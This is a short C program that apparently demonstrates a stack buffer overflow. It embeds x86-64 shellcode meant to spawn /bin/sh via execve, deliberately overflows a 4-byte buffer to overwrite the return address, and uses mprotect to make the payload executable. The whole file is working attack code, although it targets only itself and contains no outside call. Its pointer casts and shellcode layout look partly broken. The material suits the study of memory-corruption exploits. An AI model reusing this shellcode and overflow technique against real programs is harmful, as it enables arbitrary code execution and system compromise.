#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
unsigned char shellcode[]="\x55\x48\x89\xe5\xba\x00\x00\x00\x00\x48\x8d\x05\x1c\x00\x00\x00\x48\x89\xc6\x48\x8d\x3d\x0a\x00\x00\x00\xe8\x15\x00\x00\x00\x5d\xc3\x90\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x3b\x00\x00\x00\x0f\x05";
int func(char *shellcode)
{
	char str[4] = "";
	memcpy(str,shellcode,32);
	printf("%s\n",str);
	return 1;
}

void hacker()  
{  
    printf("hello world\n");
} 
int main()
{
	char str[]="1111111122223333444455556666777788889999";
	int i = sizeof(long);
	int pagesize = getpagesize();
	long *pEIP = (long*)&str[24];
	//*pEIP = &hacker;
	*pEIP = &shellcode[0];
	int base = (int)&shellcode[0]/pagesize;
	void* baseAddr = base*pagesize;
        int j =	mprotect(baseAddr,pagesize, PROT_READ|PROT_WRITE|PROT_EXEC);
	func(str);
	printf("return from func()\n");
	return 0;
}
